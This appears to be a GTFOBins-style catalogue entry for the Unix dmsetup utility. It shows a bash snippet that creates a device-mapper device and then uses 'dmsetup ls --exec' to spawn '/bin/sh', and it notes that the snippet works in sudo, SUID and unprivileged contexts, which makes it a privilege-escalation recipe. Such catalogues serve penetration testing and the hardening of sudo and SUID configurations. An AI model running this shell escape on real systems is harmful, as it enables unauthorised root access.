---
type: gtfobin
name: dmsetup
platform: Unix
functions: [shell]
tags: [gtfobin, unix, lotl]
---

# dmsetup

## shell

```bash
dmsetup create base <<EOF
0 3534848 linear /dev/loop0 94208
EOF
dmsetup ls --exec '/bin/sh -s'
```
**Contexts:** sudo, suid, unprivileged
